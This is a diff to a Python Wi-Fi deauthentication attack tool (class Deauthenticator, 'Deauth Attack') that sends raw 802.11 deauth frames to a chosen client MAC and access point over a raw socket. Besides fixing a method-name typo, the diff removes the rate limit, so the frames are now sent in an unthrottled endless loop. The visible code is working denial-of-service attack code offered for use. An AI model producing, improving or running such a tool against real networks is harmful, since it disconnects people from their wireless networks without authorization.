@@ -1,7 +1,6 @@
 import re
 import struct
 import sys
-import time
 from argparse import ArgumentParser as ArgParser
 from socket   import socket, AF_PACKET, SOCK_RAW, htons
 
@@ -22,7 +21,7 @@ class Deauthenticator:
 
     def execute(self):
         try:
-            self._parse_arguemnts()
+            self._parse_arguments()
             self._validate_arguments()
             self._build_frames()
             self._create_socket()
@@ -43,7 +42,7 @@ class Deauthenticator:
     
 
 
-    def _parse_arguemnts(self):
+    def _parse_arguments(self):
         parser = ArgParser(description='Deauth Attack')
         parser.add_argument('-t', '--target', type=str, help='Target MAC')
         parser.add_argument('-b', '--bssid',  type=str, help='BSSID')
@@ -148,18 +147,12 @@ class Deauthenticator:
     
 
     def _send_endlessly(self):
-        shots = 0
-        
         while True:
             self._update_seq_ctrl(self._target_frame)
             self._socket.send(self._target_frame)
 
             self._update_seq_ctrl(self._ap_frame)
             self._socket.send(self._ap_frame)
-
-            if shots >= 128:
-                shots = 0
-                time.sleep(0.3)
 
 
 
